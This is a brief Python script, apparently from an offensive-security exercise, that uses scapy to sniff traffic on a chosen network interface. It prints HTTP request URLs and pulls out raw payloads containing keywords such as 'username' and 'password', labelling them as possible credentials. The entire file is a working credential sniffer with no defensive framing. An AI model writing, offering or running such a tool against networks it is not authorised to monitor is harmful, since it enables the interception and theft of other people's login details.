import scapy.all as scapy
from scapy.layers import http
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', dest="interface", help='Interface name')
    options_from_parser = parser.parse_args()
    if not options_from_parser.interface:
        parser.error('[-] Please specify an interface, use --help for more info.')
    return options_from_parser


def get_url(packet):
    host = packet[http.HTTPRequest].Host
    path = packet[http.HTTPRequest].Path
    url = host + path
    return str(url)


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["usr", "username", "user", "login", "password", "pass"]
        for key in keywords:
            if key in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print('[+] HTTP Request >> ' + get_url(packet))
        login_info = get_login_info(packet)
        if login_info:
            print('\n\n[+] Possible username/password > ' + login_info + '\n\n')


def sniff(interface):
    # FILTER param doc https://biot.com/capstats/bpf.html
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


if __name__ == '__main__':
    options = get_arguments()
    sniff(options.interface)
